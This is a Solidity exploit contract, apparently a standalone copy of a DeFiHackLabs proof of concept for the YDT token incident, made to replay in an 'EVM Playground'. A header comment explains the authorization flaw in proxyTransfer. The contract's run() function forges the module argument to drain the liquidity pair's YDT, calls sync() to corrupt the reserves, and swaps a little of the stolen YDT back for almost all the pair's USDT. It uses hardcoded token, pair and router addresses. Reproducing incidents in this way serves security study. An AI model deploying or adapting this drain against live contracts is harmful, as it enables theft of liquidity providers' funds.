// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2025-05-YDTtoken).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this) — the recipient of the drained YDT/USDT is the test
// contract itself, and there is no separate attack contract), so there is no
// standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/YDTtoken_exp.sol
// (ContractTest.testExploit), with the sole adaptation that every reference to
// `address(this)` in the original test is replaced by `address(this)` here too
// (this contract IS the attacker/recipient — dynamic, not a literal).
//
// Root cause: YDTMainContract.proxyTransfer(sender, recipient, amount,
// callerModule) authorizes the call by comparing the caller-SUPPLIED
// `callerModule` argument against its known module addresses, instead of
// checking msg.sender. Since the module addresses are public, anyone can call
// proxyTransfer(pair, attacker, amount, taxModuleAddress) and move YDT out of
// the pair with no allowance check. The attacker drains the pair's YDT reserve
// down to 1,000 YDT, calls the permissionless Pair.sync() to commit the drained
// balance into reserves (breaking x*y=k), then swaps a sliver of the stolen YDT
// back into the pair through the router, buying out almost the entire USDT
// reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract YDTDrain {
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant YDT = 0x3612e4Cb34617bCac849Add27366D8D85C102eFd;
    address constant TAXMODULE = 0x013E29791A23020cF0621AeCe8649c38DaAE96f0;
    address constant PAIR = 0xFd13B6E1d07bAd77Dd248780d0c3d30859585242;
    IPancakeRouter constant ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function run() external {
        uint256 amount = IERC20(YDT).balanceOf(address(PAIR));

        // Forge the caller authorization: proxyTransfer only checks that the
        // 4th arg equals a known module address, never msg.sender. Drain the
        // pair down to exactly 1,000 YDT (6 decimals).
        address(YDT).call(
            abi.encodeWithSelector(bytes4(0xec22f4c7), address(PAIR), address(this), amount - 1000 * 1e6, address(TAXMODULE))
        );

        // Permissionless: commit the drained balance into the pair's reserves.
        address(PAIR).call(abi.encodeWithSelector(bytes4(0xfff6cae9)));

        address[] memory path = new address[](2);
        path[0] = address(YDT);
        path[1] = address(USDT);
        IERC20(YDT).approve(address(ROUTER), type(uint256).max);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(YDT).balanceOf(address(this)) / 10,
            0,
            path,
            address(this),
            block.timestamp + 200
        );
    }

    receive() external payable {}
}
